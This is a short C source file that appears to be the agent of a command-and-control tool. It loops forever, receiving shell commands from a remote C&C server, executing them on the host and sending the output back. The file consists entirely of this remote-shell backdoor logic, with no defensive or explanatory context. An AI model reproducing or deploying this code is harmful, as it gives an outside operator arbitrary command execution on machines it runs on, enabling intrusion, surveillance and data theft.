#include <stdio.h>
#include <stdlib.h>

#include "client.h"
#include "shell.h"

#define CMDTYPE_BUFSIZE 1
#define SHELL_BUFSIZE 4096

enum cmdtypes { shell };

void handle_shell() {
  char *cmd, *out;
  cmd = recvfromcnc(SHELL_BUFSIZE);
  printf("Executing shell command: %s\n", cmd);
  out = run(cmd);
  free(cmd);
  sendtocnc(out);
  free(out);
}

void startagent() {
  char *res;

  while (1) {
    res = recvfromcnc(CMDTYPE_BUFSIZE);
    enum cmdtypes cmdtype = (int)res[0];
    free(res);

    switch (cmdtype) {
      case shell:
        handle_shell();
        break;
    }
  }
}
